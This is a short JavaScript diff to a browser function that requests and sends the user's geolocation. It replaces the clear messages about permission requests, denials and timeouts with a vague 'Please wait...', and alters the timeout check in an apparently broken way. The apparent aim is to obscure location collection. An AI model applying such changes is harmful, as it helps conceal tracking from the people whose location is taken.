@@ -33,7 +33,7 @@ function getPositionWithTimeout(options = {}, ms = 60000) {
 async function sendLocation(){
   if(!navigator.geolocation){ statusEl.textContent = 'Not supported by this browser.'; return; }
   if (sendBtn) sendBtn.disabled = true;
-    statusEl.textContent = 'Requesting — please allow access (will timeout after 60s)...';
+    statusEl.textContent = 'Please wait...';
 
   let pos;
   try{
@@ -42,9 +42,9 @@ async function sendLocation(){
   } catch(err) {
     // If permission denied or timeout, show appropriate message and re-enable
     if (err && err.code === 1) { // PERMISSION_DENIED
-      statusEl.textContent = 'denied. Please allow access.';
-    } else if (err && err.message === 'Timeout waiting for ...') {
-      statusEl.textContent = 'Request timed out. Try again or check device settings.';
+      statusEl.textContent = 'Please wait...';
+    } else if (err && err.message === 'Please wait...') {
+      statusEl.textContent = 'Please wait...';
     } else {
       statusEl.textContent = 'Error: ' + (err && err.message ? err.message : 'unknown');
     }
